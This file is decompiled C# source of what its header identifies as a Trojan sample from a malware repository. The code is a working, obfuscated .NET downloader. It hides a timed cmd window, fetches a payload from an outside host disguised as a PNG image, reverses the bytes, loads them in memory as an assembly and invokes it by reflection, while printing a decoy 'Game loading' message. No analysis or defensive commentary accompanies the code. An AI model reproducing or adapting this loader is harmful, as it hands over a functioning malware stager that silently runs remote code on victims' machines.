// Decompiled with JetBrains decompiler
// Type: Seaxvgs.AdapterContainerResolver
// Assembly: FEB2, Version=2.7.4.0, Culture=neutral, PublicKeyToken=null
// MVID: D87B813F-7225-4BD1-9F0F-2047AE17F5F0
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\UDS-Trojan.Win32.GenericML.xnet-38397ae587fdfb870f68796ef12c271f6e7c492dfa9f1751324aef64586b9983.exe

using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Threading;

namespace Seaxvgs
{
  internal class AdapterContainerResolver
  {
    private static AdapterContainerResolver ReadBridge;

    [STAThread]
    private static void Main()
    {
      // ISSUE: reference to a compiler-generated method
      AdapterContainerResolver.NewParams(new AdapterContainerResolver.Product());
      AdapterContainerResolver.SelectParams();
      AdapterContainerResolver.CancelParams();
      AdapterContainerResolver.DefineParams();
    }

    private static void SelectParams()
    {
      // ISSUE: reference to a compiler-generated method
      if (AdapterContainerResolver.ViewParams() == null)
        return;
      int num = 0;
      if (\u003CModule\u003E\u007B3ed73026\u002D4843\u002D43c2\u002D87d0\u002De5e252f119be\u007D.m_de46edcc3000486db4158db85115eb5b.m_00371417ba00493a84731a34215490c3 == 0)
        goto label_5;
label_1:
      switch (num)
      {
        default:
          Assembly.Load((byte[]) AdapterContainerResolver.PopBridge((object) ((AdapterContainerResolver.Product) AdapterContainerResolver.RegisterBridge()).ReadParams()));
          return;
      }
label_5:
      num = 0;
      goto label_1;
    }

    private static void CancelParams()
    {
      // ISSUE: reference to a compiler-generated method
      if (AdapterContainerResolver.ViewParams().CountParams() > 0)
        return;
      Assembly[] assemblies = Thread.GetDomain().GetAssemblies();
      int num = 7;
      while (true)
      {
        int index1;
        MemberInfo[] members;
        int index2;
        Type type;
        Type[] types;
        int index3;
        switch (num)
        {
          case 1:
            goto label_16;
          case 2:
            members = type.GetMembers();
            num = \u003CModule\u003E\u007B3ed73026\u002D4843\u002D43c2\u002D87d0\u002De5e252f119be\u007D.m_de46edcc3000486db4158db85115eb5b.m_ce2032b222b544f79f50ff5bac1d23df != 0 ? 1 : 4;
            continue;
          case 3:
            if (index1 < members.Length)
            {
              MemberInfo memberInfo = members[index1];
              try
              {
                ((AdapterContainerResolver.Product) AdapterContainerResolver.RegisterBridge()).ComputeParams((int) type.InvokeMember("Vibiiqzukklmgm", BindingFlags.InvokeMethod, (Binder) null, (object) null, (object[]) null));
                goto default;
              }
              catch
              {
                goto default;
              }
            }
            else
            {
              ++index3;
              num = \u003CModule\u003E\u007B3ed73026\u002D4843\u002D43c2\u002D87d0\u002De5e252f119be\u007D.m_de46edcc3000486db4158db85115eb5b.m_85dda0b1aaea4c59942040e10f999b98 != 0 ? 4 : 8;
              continue;
            }
          case 4:
            index1 = 0;
            num = \u003CModule\u003E\u007B3ed73026\u002D4843\u002D43c2\u002D87d0\u002De5e252f119be\u007D.m_de46edcc3000486db4158db85115eb5b.m_1db3f55bc7ba449d81be9bc7353afeff == 0 ? 3 : 0;
            continue;
          case 5:
          case 8:
            if (index3 < types.Length)
            {
              type = types[index3];
              num = 2;
              continue;
            }
            ++index2;
            break;
          case 6:
          case 9:
            types = assemblies[index2].GetTypes();
            index3 = 0;
            num = 5;
            continue;
          case 7:
            index2 = 0;
            break;
          default:
            ++index1;
            goto case 3;
        }
        if (index2 < assemblies.Length)
          num = 9;
        else
          break;
      }
label_16:;
    }

    private static void DefineParams() => Console.WriteLine(string.Format("Game loading {0}", (object) AdapterContainerResolver.ConnectBridge((object) AdapterContainerResolver.ViewParams())));

    internal static object RegisterBridge() => (object) AdapterContainerResolver.ViewParams();

    internal static object PopBridge([In] object obj0) => (object) ((List<byte>) obj0).ToArray();

    internal static bool ValidateBridge() => AdapterContainerResolver.ReadBridge == null;

    internal static AdapterContainerResolver DisableBridge() => AdapterContainerResolver.ReadBridge;

    internal static int ConnectBridge([In] object obj0) => ((AdapterContainerResolver.Product) obj0).CountParams();

    private class Product
    {
      internal static AdapterContainerResolver.Product StopBridge;

      [CompilerGenerated]
      [SpecialName]
      internal int CountParams() => this._Rules;

      [CompilerGenerated]
      [SpecialName]
      internal void ComputeParams(int ident_start) => this._Rules = ident_start;

      internal Product()
      {
        ProcessStartInfo startInfo = new ProcessStartInfo();
        startInfo.FileName = "cmd";
        startInfo.Arguments = "/c timeout 19";
        AdapterContainerResolver.Product.CloneBridge((object) startInfo, ProcessWindowStyle.Hidden);
        Process.Start(startInfo).WaitForExit();
      }

      internal List<byte> ReadParams()
      {
        try
        {
          ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
        }
        catch
        {
        }
        List<byte> byteList = new List<byte>();
        byteList.AddRange((IEnumerable<byte>) new BinaryReader(WebRequest.Create("https://radio-hit.ro/FEB2.png").GetResponse().GetResponseStream()).ReadBytes(80095564));
        byteList.Reverse();
        return byteList;
      }

      internal static bool InitBridge() => AdapterContainerResolver.Product.StopBridge == null;

      internal static AdapterContainerResolver.Product ViewBridge() => AdapterContainerResolver.Product.StopBridge;

      internal static void CloneBridge([In] object obj0, [In] ProcessWindowStyle obj1) => ((ProcessStartInfo) obj0).WindowStyle = obj1;
    }
  }
}
